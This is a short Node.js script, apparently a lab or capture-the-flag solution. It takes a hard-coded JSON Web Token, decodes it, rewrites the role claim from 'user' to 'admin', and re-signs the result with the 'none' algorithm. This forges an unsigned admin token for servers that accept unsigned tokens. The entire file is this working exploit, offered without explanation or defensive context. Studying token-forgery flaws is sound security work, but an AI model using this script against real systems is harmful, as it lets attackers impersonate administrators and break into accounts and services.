const jwt = require('jsonwebtoken');

const token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjIyMzQ1Mzc2MjU0LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85MS4wLjQ0NzIuNzcgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjIyMzQ1Mzc2fQ.97VNWFF1j6HYMrvqG6Yzv8w9PHm0AtYLHKG0i5f75Ik';

(async () => {
    try {
      const payload = await jwt.decode(token);
      payload.role = "admin";
      const text = await jwt.sign(
        payload,
        undefined,
        { algorithm: 'none' },
      );
      console.log(text);
    } catch (e) {
        // Deal with the fact the chain failed
    }
})();
